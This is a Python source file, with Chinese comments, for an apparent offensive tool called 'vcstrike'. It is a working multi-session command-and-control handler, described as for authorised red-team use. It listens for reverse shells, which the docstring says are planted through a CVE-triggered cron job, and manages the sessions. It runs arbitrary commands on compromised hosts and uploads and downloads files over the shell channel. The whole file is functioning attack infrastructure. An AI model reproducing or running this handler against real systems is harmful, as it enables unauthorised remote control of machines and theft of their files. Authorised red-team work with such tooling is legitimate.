"""多会话 C2（授权红队用途）：反弹 shell 监听、会话管理、交互与文件传输。

定位说明：这是一个"会话管理器/命令分发台"（类似 metasploit multi/handler
+ sessions），不是隐蔽植入体框架 —— 不实现 beacon 心跳、开机持久化、
流量伪装与免杀。植入端即标准 bash/python 反弹 shell（由 CVE-2026-59310
的 cron 触发），断线不自动重连；重连 = 重新植入（见 plant_revshell）。

用法（CLI）：
    python -m vcstrike listen --ports 4444,8443
    python -m vcstrike revshell <host> --lhost <ip> --lport 4444

REPL 命令（均带会话 id）：help / sessions / listeners / use <id> / back /
    close <id> / exec <id> <cmd> / upload <id> <local> <remote> /
    download <id> <remote> <local> / exit
    会话直通模式下其他输入转发 shell；exit 返回 c2>，顶层 exit 退出控制台。
    命令名是保留字：要在目标上执行同名命令请用 exec <id> <cmd>。
"""
import base64
import hashlib
import os
import re
import shlex
import socket
import threading
import time


class Session:
    _next_id = 1
    _next_lock = threading.Lock()

    def __init__(self, conn, addr, on_log=lambda s: None):
        with Session._next_lock:
            self.id = Session._next_id
            Session._next_id += 1
        self.conn = conn
        self.addr = "%s:%d" % addr
        self.created = time.strftime("%H:%M:%S")
        self.last_seen = time.time()
        self.alive = True
        self._log = on_log
        self._lock = threading.Lock()
        self._recv_lock = threading.Lock()   # 串行化读取（防 exec/probe/传输并发混流）
        self.name = ""

    def send_line(self, cmd):
        with self._lock:
            self.conn.sendall(cmd.encode() + b"\n")
            self.last_seen = time.time()

    def read_until_quiet(self, quiet=1.2, maxwait=12):
        """读取输出直到静默 quiet 秒或超过 maxwait（持读锁，防并发混流）。"""
        with self._recv_lock:
            return self._read_until_quiet_locked(quiet, maxwait)

    def _read_until_quiet_locked(self, quiet, maxwait):
        buf = b""
        self.conn.settimeout(quiet)
        deadline = time.time() + maxwait
        while time.time() < deadline:
            try:
                d = self.conn.recv(65536)
                if not d:
                    self.alive = False
                    break
                buf += d
                self.last_seen = time.time()
                if not d.strip():   # 纯空白（提示符回显）也继续等一小会
                    continue
            except socket.timeout:
                break
            except OSError:
                self.alive = False
                break
        return buf.decode("utf-8", "replace")

    def probe(self):
        """存活探测。"""
        try:
            self.send_line("")
            self.read_until_quiet(0.6, 2)
            return self.alive
        except OSError:
            self.alive = False
            return False

    def close(self):
        self.alive = False
        try:
            self.conn.close()
        except Exception:
            pass


class SessionManager:
    """监听器 + 会话注册表。线程安全。"""

    def __init__(self, log=lambda s: None):
        self.sessions = {}
        self._lock = threading.Lock()
        self.listeners = []          # [(port, srv_sock)]
        self._log = log
        self.on_new_session = None   # callback(session) —— GUI 挂钩

    # ---- 监听器 ----
    def add_listener(self, port):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(8)
        self.listeners.append((port, srv))
        threading.Thread(target=self._accept_loop, args=(port, srv),
                         daemon=True).start()
        self._log("[+] 监听 0.0.0.0:%d（等待回连）" % port)
        return port

    def _accept_loop(self, port, srv):
        srv.settimeout(None)
        while True:
            try:
                conn, addr = srv.accept()
            except OSError:
                return
            conn.settimeout(2)
            sess = Session(conn, addr, on_log=self._log)
            with self._lock:
                self.sessions[sess.id] = sess
            self._log("[+] 新会话 #%d ← %s（端口 %d）" % (sess.id, sess.addr, port))
            if self.on_new_session:
                try:
                    self.on_new_session(sess)
                except Exception:
                    pass

    # ---- 会话操作 ----
    def get(self, sid):
        with self._lock:
            return self.sessions.get(sid)

    def list_sessions(self):
        with self._lock:
            return list(self.sessions.values())

    def exec(self, sid, cmd, timeout=12, quiet=1.2):
        s = self.get(sid)
        if not s or not s.alive:
            raise RuntimeError("会话 #%s 不存在或已断开" % sid)
        s.send_line(cmd)
        return s.read_until_quiet(quiet=quiet, maxwait=timeout)

    def close(self, sid):
        s = self.get(sid)
        if s:
            s.close()
            with self._lock:
                self.sessions.pop(sid, None)
            self._log("[i] 会话 #%d 已关闭" % sid)

    # ---- 文件传输（经 shell 通道，base64 分块） ----
    def upload(self, sid, local, remote, chunk=8192, progress=None):
        with open(local, "rb") as f:
            data = f.read()
        total = max(1, (len(data) + chunk - 1) // chunk)
        rq = "'%s'" % remote.replace("'", "'\\''")   # 远端路径引号安全
        self.exec(sid, "rm -f -- %s" % rq, timeout=4, quiet=0.4)
        for i in range(0, len(data), chunk):
            b64 = base64.b64encode(data[i:i + chunk]).decode()
            self.exec(sid, "printf %%s %s | base64 -d >> %s" % (b64, rq),
                      timeout=20, quiet=0.4)
            if progress:
                progress(i // chunk + 1, total)
        out = self.exec(sid, "md5sum %s" % rq, timeout=15)
        local_md5 = hashlib.md5(data).hexdigest()
        m = re.search(r"([0-9a-f]{32})", out)
        if not m or m.group(1) != local_md5:
            raise RuntimeError("上传校验失败（远端 md5 不匹配）：%s" % out.strip()[:120])
        return "上传完成，md5 校验一致（%s）" % local_md5

    def download(self, sid, remote, local, timeout=60):
        rq = "'%s'" % remote.replace("'", "'\\''")
        out = self.exec(sid, "base64 -w0 %s 2>&1" % rq, timeout=timeout, quiet=2.0)
        lines = [ln.strip() for ln in out.splitlines() if ln.strip()]
        cand = ""
        for ln in reversed(lines):
            if all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in ln):
                cand = ln
                break
        if not cand:
            raise RuntimeError("未取到有效 base64 输出：%s" % out[:200])
        try:
            data = base64.b64decode(cand, validate=True)
        except Exception as e:
            raise RuntimeError(
                "base64 解码失败（输出可能被截断；大文件请先 gzip 或增大超时）：%s" % e)
        os.makedirs(os.path.dirname(os.path.abspath(local)), exist_ok=True)
        with open(local, "wb") as f:
            f.write(data)
        return "已保存 %s（%d 字节）" % (local, len(data))

    def shutdown(self):
        for _p, srv in self.listeners:
            try:
                srv.close()
            except Exception:
                pass
        for s in self.list_sessions():
            s.close()


HELP_TEXT = """\
可用命令（命令名为保留字；会话内要执行同名 shell 命令请用 exec <id> ...）：
  help                            本帮助
  sessions                        列出会话
  listeners                       查看监听端口
  use <id> / back                 进入/退出会话直通（原始 shell）
  exec <id> <cmd...>              在会话执行命令并回显
  upload <id> <local> <remote>    上传（md5 自动校验；路径含空格请加引号）
  download <id> <remote> <local>  下载（base64 校验；大文件建议先 gzip）
  close <id>                      关闭会话
  exit                            会话直通中返回 c2>；顶层退出控制台
提示：长时间无输出的命令（sleep/dd 等）会被静默判定提前返回；
      download 单次读回受超时限制，超大文件先压缩。
"""


def interactive_loop(mgr, stdin=None):
    """CLI 交互台。"""
    print(HELP_TEXT)
    cur = None
    while True:
        try:
            prompt = "session#%d> " % cur.id if cur else "c2> "
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        parts = line.split()
        cmd = parts[0].lower()
        if cmd in ("exit", "quit"):
            if cur is not None and cmd == "exit":
                cur = None
                print("[i] 返回 c2> 控制台（退出整个控制台请先 back）")
                continue
            break
        elif cmd == "help":
            print(HELP_TEXT)
        elif cmd == "sessions":
            for s in mgr.list_sessions():
                print("  #%d  %-22s 创建 %s  %s" %
                      (s.id, s.addr, s.created, "存活" if s.alive else "已断开"))
        elif cmd == "listeners":
            for p, _ in mgr.listeners:
                print("  :%d" % p)
        elif cmd == "use":
            try:
                s = mgr.get(int(parts[1]))
                if not s:
                    print("[-] 无此会话")
                else:
                    cur = s
            except (IndexError, ValueError):
                print("[-] 用法: use <id>")
        elif cmd == "back":
            cur = None
        elif cmd == "close":
            try:
                mgr.close(int(parts[1]))
            except (IndexError, ValueError):
                print("[-] 用法: close <id>")
        elif cmd == "exec":
            try:
                sid = int(parts[1])
                rest = line.split(None, 2)[2]
            except (IndexError, ValueError):
                print("[-] 用法: exec <id> <cmd>")
                continue
            try:
                print(mgr.exec(sid, rest))
            except (RuntimeError, OSError) as e:
                print("[-] %s" % e)
        elif cmd == "upload":
            try:
                sid = int(parts[1])
                toks = shlex.split(line.split(None, 3)[3])
                local, remote = toks[0], toks[1]
            except (IndexError, ValueError):
                print("[-] 用法: upload <id> <local> <remote>（路径含空格加引号）")
                continue
            try:
                mgr.upload(sid, local, remote,
                           progress=lambda i, t: print("  [%.0f%%]" % (i * 100.0 / t)))
            except (RuntimeError, OSError) as e:
                print("[-] %s" % e)
        elif cmd == "download":
            try:
                sid = int(parts[1])
                toks = shlex.split(line.split(None, 3)[3])
                remote, local = toks[0], toks[1]
            except (IndexError, ValueError):
                print("[-] 用法: download <id> <remote> <local>（路径含空格加引号）")
                continue
            try:
                print(mgr.download(sid, remote, local))
            except (RuntimeError, OSError) as e:
                print("[-] %s" % e)
        elif cur is not None:
            # 会话直通模式（顶层保留字已在前面分支处理）
            try:
                out = mgr.exec(cur.id, line)
            except (RuntimeError, OSError) as e:
                print("[-] %s" % e)
                if not cur.alive:
                    print("[!] 会话已断开")
                    cur = None
                continue
            print(out, end="" if out.endswith("\n") else "\n")
            if not cur.alive:
                print("[!] 会话已断开")
                cur = None
        else:
            print("[-] 未知命令（help 查看）")
